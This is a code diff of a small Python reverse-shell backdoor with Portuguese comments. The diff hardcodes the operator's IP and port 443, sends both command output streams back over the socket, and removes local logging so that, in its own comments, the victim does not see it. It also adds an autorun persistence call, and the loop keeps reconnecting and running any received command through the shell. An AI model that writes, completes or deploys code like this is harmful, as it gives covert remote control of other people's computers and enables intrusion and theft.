@@ -1,14 +1,12 @@
-#CONEXAO TCP
-
 import socket
 import time
 import subprocess
 import threading
 import os
 
-IP = ""
-#INT PODE SER DO NETCAT
+IP = "192.168.100.104"
 PORT = 443
+
 
 def autorun():
     filename = os.path.basename(__file__)
@@ -22,14 +20,14 @@ def connect(IP, PORT):
         client.connect((IP, PORT))
         return client
     except Exception as error:
-        print("error connect", error) # LEMBRAR DE TIRAR LOG AO FINALIZAR, O CLIENTE NAO PRECISA VER O LOG NÉ :p
-        
+        print("error connect", error)
+
 
 def cmd(client, data):
     try:
         proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-        print(proc.stdout.read()) # REMOVER DEPOIS DE FINALIZAR O CÓDIGO
-        client.send(proc.stdout.read() + b"\n")
+        output = proc.stdout.read() + proc.stderr.read()
+        client.send(output + b"\n")
     except Exception as error:
         print("error cmd", error)
 
@@ -41,7 +39,6 @@ def listen(client):
             if data == "/exit":
                 return
             else:
-                #AQUI É ONDE DEFINIMOS COMO EXECUTAR COMANDOS     
                 threading.Thread(target=cmd, args=(client, data)).start()
 
     except Exception as error:
@@ -50,6 +47,7 @@ def listen(client):
 
 
 if __name__ == "__main__":
+    autorun()
     while True:
         client = connect(IP, PORT)
         if client:
